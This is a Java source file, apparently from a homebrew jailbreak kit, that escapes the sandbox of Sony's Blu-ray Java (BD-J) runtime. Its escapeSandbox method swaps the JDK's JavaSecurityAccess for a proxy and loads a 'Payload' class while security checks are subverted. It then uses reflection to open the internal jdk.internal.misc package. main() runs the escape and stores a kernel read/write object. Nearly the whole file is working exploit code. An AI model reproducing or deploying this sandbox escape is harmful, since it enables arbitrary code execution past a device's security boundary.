package com.bdjplus.kernel;

import com.sony.bdjstack.system.BDJModule;
import jdk.internal.access.JavaSecurityAccess;
import jdk.internal.access.SharedSecrets;
import org.dvb.event.EventManager;
import org.dvb.event.UserEventRepository;

import java.lang.Module;
import java.lang.ModuleLayer;

import java.util.*;

public class KernelModule {
    private static String filePath = null;
    private static KernelRW kernelRW;

    public static void main(String[] args) {
        filePath = args[0];
        BDJModule.log("KernelModule loaded: " + filePath);

        //BDJModule.log(BDJModule.mainThread.getThreadGroup().);

        try {
            escapeSandbox(KernelModule.class);
            kernelRW = new KernelRW();
            BDJModule.properties.put("KernelRW", kernelRW);
            BDJModule.properties.put("KernelModule", KernelModule.class);


            BDJModule.debug("Sandbox escaped thanks to TheOfficialFloW and sleirsgoevy");
        } catch (Exception e) {
            BDJModule.log(e);
        }
    }

    public static void ready()
    {
        UserEventRepository uer = new UserEventRepository("KeyEventListener");
        uer.addAllArrowKeys();
        uer.addAllColourKeys();
        uer.addAllNumericKeys();;
        for(int i = 0; i < 10000; i++)
            uer.addKey(i);

        try {
            escapeSandbox(UserEventListener.class);
        }catch (Exception e)
        {

        }

        EventManager.getInstance().addUserEventListener(new UserEventListener(), uer);
    }
    public static void escapeSandbox(Class bypassClass) throws Exception {
        JavaSecurityAccess real = SharedSecrets.getJavaSecurityAccess();
        JavaSecurityProxy fake = new JavaSecurityProxy(real);
        SharedSecrets.setJavaSecurityAccess(fake);
        java.net.URLClassLoader ldr = java.net.URLClassLoader.newInstance(new java.net.URL[]{new java.net.URL("file://" + filePath)});
        ldr.loadClass("com.bdjplus.kernel.Payload").newInstance();
        SharedSecrets.setJavaSecurityAccess(real);
        Iterator iter = ModuleLayer.boot().modules().iterator();
        Module java_base = null;
        while(!(java_base = (Module)iter.next()).getName().equals("java.base"));
        java.lang.reflect.Method getModule = Class.class.getDeclaredMethod("getModule", new Class[0]);
        getModule.setAccessible(true);
        Module own_module = (Module)getModule.invoke(bypassClass, null);
        Set own = new HashSet();
        own.add(own_module);
        java.lang.reflect.Field openPackages = Module.class.getDeclaredField("openPackages");
        openPackages.setAccessible(true);
        Map pkgs = (Map)openPackages.get(java_base);
        pkgs.put("jdk.internal.misc", own);
    }
}
